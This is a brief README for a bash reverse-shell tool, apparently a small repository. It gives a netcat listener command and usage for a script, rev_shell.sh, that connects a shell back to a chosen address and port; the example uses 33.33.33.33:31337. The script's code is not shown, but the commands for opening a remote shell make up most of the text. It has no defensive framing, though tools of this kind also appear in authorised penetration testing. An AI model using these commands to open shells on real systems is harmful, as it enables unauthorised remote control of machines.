# bash_rev_shell
Simple reverse shell in bash

# Usage

First run listener on machine where you want to access revers shell.
for example:
```
nc -l -p 8080 -vvv
```

```
USAGE: ./rev_shell.sh [-a <ip_address_or_fqdn> -p <port_number>]

Example: ./rev_shell.sh -a 33.33.33.33 -p 31337

Options:
 -a ip addres or hostname
 -p port number
 -h print little help
 ```

